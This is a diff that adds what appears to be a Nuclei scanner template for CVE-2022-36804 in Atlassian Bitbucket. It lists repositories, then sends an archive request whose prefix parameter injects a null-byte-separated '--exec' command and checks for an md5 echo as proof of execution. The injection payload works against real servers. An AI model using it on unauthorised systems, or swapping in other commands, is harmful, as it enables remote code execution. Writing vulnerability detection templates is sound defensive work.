@@ -1,0 +1,51 @@
+id: cve-2022-36804
+info:
+  name: Atlassian Bitbucket Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Command injection vulnerabilities exist in multiple API endpoints of Atlassian Bitbucket Server and Data Center. These vulnerabilities can allow remote code execution by sending malicious HTTP requests with read access to public or private Bitbucket repositories.
+  reference:
+    - https://jira.atlassian.com/browse/BSERV-13438
+  classification:
+    cve-id: CVE-2022-36804
+  tags: command-execution
+
+variables:
+  rand: '{{rand_base(5)}}'
+  md5sum: '{{md5(rand)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-repositories
+    method: GET
+    path:
+      - '{{BaseURL}}/rest/api/latest/repos'
+    headers:
+      Cookie: '{{Cookie}}'
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "project"
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.values[] | {slug: .slug, key: .project.key}'
+        internal: true
+
+  - id: exploit-command-injection
+    method: GET
+    path:
+      - '{{BaseURL}}/rest/api/latest/projects/{{key}}/repos/{{slug}}/archive?prefix=ax%00--exec=%60echo+-n+{{rand}}|md5sum%60%00--remote=origin'
+    headers:
+      Cookie: '{{Cookie}}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5sum}}'
